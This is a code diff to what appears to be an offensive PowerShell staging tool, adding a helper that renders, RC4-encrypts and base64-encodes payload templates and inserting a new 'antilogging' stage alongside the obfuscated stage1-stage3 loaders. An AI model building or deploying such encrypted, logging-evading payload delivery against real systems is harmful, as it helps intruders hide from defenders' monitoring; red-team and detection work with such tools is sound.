@@ -230,6 +230,14 @@ def debug_filter(msg, dbg=False):
     return ""
 
 
+def load_and_encrypt_template(env, key, filename, context):
+    template = env.get_template(os.path.join('powershell', filename))
+    result = template.render(**context)
+    result = encrypt_rc4(result.encode(), key)
+    result = base64.b64encode(result).decode()
+    return result
+
+
 def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
               debug=False, natural=False, remove_whitespace=True):
     from jinja2 import Environment, FileSystemLoader
@@ -247,11 +255,8 @@ def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
     env.globals['set_alias'] = obfuscate_set_alias
 
     stage1_template = env.get_template(os.path.join('powershell', 'stage1.ps1'))
-
-    stage2_template = env.get_template(os.path.join('powershell', 'stage2.ps1'))
-    stage2 = stage2_template.render(**context)
-    stage2 = encrypt_rc4(stage2.encode(), key)
-    stage2 = base64.b64encode(stage2).decode()
+    antilogging = load_and_encrypt_template(env, key, 'antilogging.ps1', context)
+    stage2 = load_and_encrypt_template(env, key, 'stage2.ps1', context)
 
     stage3 = []
     for t in stage3_files + stage3_strings:
@@ -267,6 +272,7 @@ def get_stage(key, context={}, stage3_files=[], stage3_strings=[],
                 buffer = encrypt_aes(buffer, key)
             stage3.append(buffer)
 
+    context['antilogging'] = antilogging
     context['stage2'] = stage2
     context['stage3'] = stage3
 
